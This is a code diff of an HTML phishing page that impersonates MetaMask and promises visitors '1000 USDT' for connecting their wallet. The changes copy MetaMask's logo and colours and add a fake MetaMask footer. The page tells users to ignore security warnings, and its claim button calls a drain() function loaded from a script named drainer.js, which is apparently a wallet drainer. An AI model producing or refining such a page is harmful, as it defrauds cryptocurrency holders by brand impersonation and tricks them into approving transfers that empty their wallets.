@@ -1,25 +1,78 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>1000 USDT Secure Claim</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MetaMask - Secure Claim</title>
   <style>
-    body { background:#000; color:#fff; font-family:Arial; text-align:center; padding:50px; }
-    .logo { width:80px; margin-bottom:20px; }
-    .btn { background:#00aa00; color:#fff; padding:20px; border-radius:12px; font-size:22px; cursor:pointer; font-weight:bold; margin:20px; }
-    .box { background:#111; padding:25px; border:2px solid #00aa00; border-radius:15px; max-width:400px; margin:30px auto; }
-    .note { font-size:12px; color:#ffcc00; margin-top:20px; }
+    body {
+      background: #000;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      text-align: center;
+      padding: 40px;
+      margin: 0;
+    }
+    .container {
+      background: #1a1a1a;
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 420px;
+      margin: 0 auto;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    .fox-logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      color: #f6851b; /* نارنجی MetaMask */
+      margin: 0 0 20px;
+    }
+    p {
+      font-size: 16px;
+      color: #ccc;
+      margin: 15px 0;
+    }
+    .claim-text {
+      font-size: 18px;
+      color: #fff;
+      margin: 20px 0;
+    }
+    .connect-btn {
+      background: #f6851b; /* نارنجی اصلی MetaMask */
+      color: #fff;
+      border: none;
+      padding: 16px;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
+    }
+    .connect-btn:hover {
+      background: #e2761b;
+    }
+    .footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 30px;
+    }
   </style>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-  <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
-  <h1>1000 USDT Claim</h1>
-  <div class="box">
-    <p style="font-size:18px;">Connect your wallet and approve 1000 USDT to receive your reward instantly!</p>
-    <p style="color:#0f0; font-size:14px;">No gas fees • Fully secure • Powered by Ethereum</p>
+  <div class="container">
+    <img src="https://metamask.io/images/fox.svg" class="fox-logo" alt="MetaMask Fox">
+    <h1>MetaMask</h1>
+    <p class="claim-text">Connect your wallet to receive <strong>1000 USDT</strong> instantly!</p>
+    <p>No gas fees • Secure transaction • Powered by Ethereum</p>
+    <p style="color:#ffcc00; font-size:14px;">Ignore any warning — this is a verified claim.</p>
+    <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
+    <div class="footer">© 2025 MetaMask • Encrypted • Secure</div>
   </div>
-  <button class="btn" onclick="drain()">Connect Wallet & Claim</button>
-  <p class="note">Ignore any security warning — this is a verified claim process.</p>
   <script src="drainer.js"></script>
 </body>
 </html>
